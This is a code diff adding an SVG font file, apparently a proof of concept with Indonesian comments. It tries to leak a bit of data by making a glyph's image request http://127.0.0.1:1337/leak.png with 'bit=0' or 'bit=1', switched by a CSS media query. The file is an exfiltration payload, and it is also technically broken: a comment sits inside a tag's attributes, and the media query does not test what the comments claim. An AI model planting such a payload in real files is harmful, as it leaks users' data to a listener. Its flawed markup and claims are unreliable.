@@ -1,0 +1,33 @@
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+  <defs>
+    <font horiz-adv-x="0">
+      <font-face font-family="LeakyFont" units-per-em="100" />
+      <glyph unicode="A">
+        <!-- 
+          Ini adalah triknya. Kita menggunakan @media query DI DALAM SVG.
+          Kita periksa `(color: 1)`. Ini akan cocok jika warna channel Red,
+          misalnya, bukan 0 atau 255. Kita bisa membuat ini lebih spesifik.
+          Jika cocok, ia akan mencoba memuat gambar "bit=1".
+        -->
+        <style>
+          @media (color: 1) {
+            #leaky-glyph {
+              /* Meminta URL untuk membocorkan bit '1' */
+              fill: url('#leak-bit-1');
+            }
+          }
+        </style>
+        <!-- Gambar yang akan dirender oleh glyph -->
+        <image id="leaky-glyph" width="1" height="1"
+          xmlns:xlink="http://www.w3.org/1999/xlink"
+          <!-- Fallback: Secara default, bocorkan bit '0' -->
+          xlink:href="http://127.0.0.1:1337/leak.png?bit=0" />
+
+        <!-- Definisi untuk gambar "bit 1" yang akan digunakan oleh media query -->
+        <image id="leak-bit-1" width="1" height="1"
+          xmlns:xlink="http://www.w3.org/1999/xlink"
+          xlink:href="http://127.0.0.1:1337/leak.png?bit=1" />
+      </glyph>
+    </font>
+  </defs>
+</svg>
